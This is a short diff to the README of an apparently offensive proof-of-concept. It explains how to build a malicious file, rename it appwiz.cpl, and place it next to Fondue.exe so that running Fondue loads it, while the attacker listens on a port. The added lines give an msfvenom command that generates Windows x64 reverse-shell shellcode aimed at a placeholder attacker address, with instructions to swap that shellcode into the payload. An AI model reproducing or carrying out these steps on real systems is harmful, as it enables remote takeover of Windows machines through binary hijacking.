@@ -7,3 +7,7 @@
 4 - Build it, rename it as appwiz.cpl and save it in the same folder as Fondue.exe and execute fondue
 
 5 - On attacker side, listen on the port specified in the .cpp
+
+If using process migration / process injection, change the payload with:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKERIP LPORT=ATTACKERPORT -f c
+replace the shellcode
